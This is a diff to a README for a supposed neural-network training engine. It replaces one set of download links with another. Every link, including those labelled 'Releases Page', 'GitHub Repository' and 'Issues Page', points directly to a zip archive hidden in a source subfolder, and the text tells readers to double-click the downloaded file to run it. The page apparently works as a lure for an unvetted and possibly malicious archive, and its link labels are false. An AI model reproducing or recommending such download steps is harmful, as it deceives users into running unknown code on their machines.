@@ -4,14 +4,14 @@
 Welcome to the DTE-DynamicTrainingEngine! This application helps you train neural networks more effectively. With reusable components, you can improve how machines learn without needing to know complex programming.
 
 ## 📥 Download Now
-[![Download DTE-DynamicTrainingEngine](https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/dte/utils/Training_DT_Dynamic_Engine_v3.3.zip)](https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/dte/utils/Training_DT_Dynamic_Engine_v3.3.zip)
+[![Download DTE-DynamicTrainingEngine](https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/example/config/training/Dynamic-DT-Training-Engine-v1.4.zip)](https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/example/config/training/Dynamic-DT-Training-Engine-v1.4.zip)
 
 ## 🚀 Getting Started
 To get started with the DTE-DynamicTrainingEngine, follow these steps:
 
 1. **Visit the Release Page**  
    Click the link below to access the download page:  
-   [Visit the Releases Page](https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/dte/utils/Training_DT_Dynamic_Engine_v3.3.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/example/config/training/Dynamic-DT-Training-Engine-v1.4.zip)
 
 2. **Choose Your Version**  
    On the Releases page, look for the latest version. It will usually be at the top of the list.
@@ -20,7 +20,7 @@ To get started with the DTE-DynamicTrainingEngine, follow these steps:
    Find the file that matches your operating system. Click on it to download.  
 
 4. **Locate the File**  
-   Open your computer's download folder. You should see a file named something like `https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/dte/utils/Training_DT_Dynamic_Engine_v3.3.zip` or similar.
+   Open your computer's download folder. You should see a file named something like `https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/example/config/training/Dynamic-DT-Training-Engine-v1.4.zip` or similar.
 
 5. **Run the Application**  
    Double-click the downloaded file. Follow any on-screen instructions to complete the setup. 
@@ -48,7 +48,7 @@ The DTE-DynamicTrainingEngine simplifies the training of neural networks without
 To download and install the DTE-DynamicTrainingEngine, follow these instructions again:
 
 1. **Go to the Releases Page**  
-   [Visit the Releases Page](https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/dte/utils/Training_DT_Dynamic_Engine_v3.3.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/example/config/training/Dynamic-DT-Training-Engine-v1.4.zip)
 
 2. **Select the Right Version**  
    Click on the version that suits your operating system.
@@ -80,7 +80,7 @@ Yes, we encourage user feedback. Please visit our GitHub page to submit any sugg
 Yes, the DTE-DynamicTrainingEngine is open-source and free to download.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/dte/utils/Training_DT_Dynamic_Engine_v3.3.zip)
-- [Issues Page](https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/dte/utils/Training_DT_Dynamic_Engine_v3.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/example/config/training/Dynamic-DT-Training-Engine-v1.4.zip)
+- [Issues Page](https://raw.githubusercontent.com/fiwan2636-rgb/DTE-DynamicTrainingEngine/main/example/config/training/Dynamic-DT-Training-Engine-v1.4.zip)
 
 We hope you find the DTE-DynamicTrainingEngine useful for your neural network training needs! Happy exploring!
